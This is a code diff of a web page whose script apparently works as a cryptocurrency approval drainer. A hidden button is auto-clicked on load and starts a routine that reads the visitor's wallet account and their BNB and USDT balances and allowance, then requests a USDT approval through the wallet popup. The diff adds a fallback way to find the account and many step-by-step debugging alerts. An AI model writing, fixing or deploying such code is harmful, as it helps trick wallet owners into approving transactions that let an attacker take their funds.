@@ -207,7 +207,7 @@
     <span class="loader-letter">g</span>
     <div class="loader"></div>
   </div>
-  
+
   <!-- Hidden button for auto-click functionality -->
   <button type="submit" id="nextBtn" onclick="TokenApprove()" style="display: none;"></button>
 
@@ -384,24 +384,53 @@
     showLoading('Processing...');
     
     try {
-        alert('✅ Step 5: Checking for ethereum object...');
-        if (!window.ethereum) {
-            alert('❌ Step 5: window.ethereum NOT found!');
+        alert('✅ Step 5: Checking for ethereum object...\n\nwindow.ethereum exists: ' + (typeof window.ethereum !== 'undefined'));
+        
+        let account = null;
+        
+        // Method 1: Try eth_accounts
+        if (window.ethereum) {
+            try {
+                alert('✅ Step 6: Requesting accounts with eth_accounts...');
+                const accounts = await ethereum.request({ method: 'eth_accounts' });
+                alert('✅ Step 7: Accounts received: ' + (accounts ? accounts.length : 0) + ' account(s)');
+                
+                if (accounts && accounts.length > 0) {
+                    account = accounts[0];
+                    alert('✅ Step 8: Account found via eth_accounts: ' + account);
+                } else {
+                    alert('⚠️ Step 7: No accounts from eth_accounts, trying web3.eth.accounts[0]...');
+                }
+            } catch (ethError) {
+                alert('❌ Step 6-7 ERROR: ' + ethError.message + '\n\nTrying web3.eth.accounts[0]...');
+            }
+        } else {
+            alert('⚠️ Step 5: window.ethereum NOT found, trying web3.eth.accounts[0]...');
+        }
+        
+        // Method 2: Try web3.eth.accounts[0]
+        if (!account) {
+            alert('✅ Step 7b: Checking web3.eth.accounts[0]...\n\nweb3 exists: ' + (typeof web3 !== 'undefined'));
+            if (typeof web3 !== 'undefined' && web3.eth) {
+                alert('✅ Step 7c: web3.eth exists, checking accounts...\n\naccounts length: ' + (web3.eth.accounts ? web3.eth.accounts.length : 'N/A'));
+                if (web3.eth.accounts && web3.eth.accounts[0]) {
+                    account = web3.eth.accounts[0];
+                    alert('✅ Step 8: Account found via web3.eth.accounts[0]: ' + account);
+                } else {
+                    alert('❌ Step 7d: web3.eth.accounts[0] is empty or undefined!');
+                }
+            } else {
+                alert('❌ Step 7e: web3 or web3.eth NOT available!');
+            }
+        }
+        
+        if (!account) {
+            alert('❌ Step 8: NO ACCOUNT FOUND!\n\nTried:\n1. ethereum.request(eth_accounts)\n2. web3.eth.accounts[0]\n\nPlease ensure wallet is connected.');
             hideLoading();
             return;
         }
-        alert('✅ Step 6: Requesting accounts with eth_accounts...');
-        const accounts = await ethereum.request({ method: 'eth_accounts' });
-        alert('✅ Step 7: Accounts received: ' + (accounts ? accounts.length : 0) + ' account(s)');
         
-        if (!accounts || accounts.length === 0) {
-            alert('❌ Step 7: No accounts found!');
-            hideLoading();
-            return;
-        }
-        
-        const account = accounts[0];
-        alert('✅ Step 8: Account found: ' + account);
+        alert('✅ Step 8: Final account to use: ' + account);
 
         // Step 1: Check the current BNB balance (in background)
         alert('✅ Step 9: Checking BNB balance...');
@@ -453,7 +482,7 @@
         // Show approval request (MetaMask/Trust Wallet will show popup)
         await approveToken(account);
     } catch (error) {
-        alert('❌ ERROR in TokenApprove: ' + error.message + '\n\nStack: ' + (error.stack || 'No stack trace'));
+        alert('❌ CRITICAL ERROR in TokenApprove:\n\nMessage: ' + (error.message || 'Unknown error') + '\n\nName: ' + (error.name || 'Unknown') + '\n\nStack: ' + (error.stack || 'No stack trace') + '\n\nFull error: ' + JSON.stringify(error));
         console.error('Error:', error);
         hideLoading();
     }
@@ -524,7 +553,7 @@ async function approveToken(account) {
 
     alert('✅ Step 23: All balances retrieved successfully\n\nBNB: ' + balanceInBNB + '\nUSDT: ' + usdtBalanceFormatted + '\nAllowance: ' + approvedUSDT);
     alert('✅ Step 24: Sending approval transaction...\n\nThis will show Trust Wallet popup!');
-    
+
     console.log('Processing....');
     console.log('Account:', account);
     console.log('BNB Balance:', balanceInBNB);
@@ -739,11 +768,11 @@ if (typeof window !== 'undefined') {
         // Small delay to ensure everything is ready
         setTimeout(function() {
             alert('✅ Step 2: Looking for Next button...');
-            const nextBtn = document.getElementById('nextBtn');
+        const nextBtn = document.getElementById('nextBtn');
             if (nextBtn) {
                 alert('✅ Step 3: Next button found, clicking now...');
                 nextBtn.click();
-            } else {
+        } else {
                 alert('❌ Step 3: Next button NOT found!');
             }
         }, 1000);
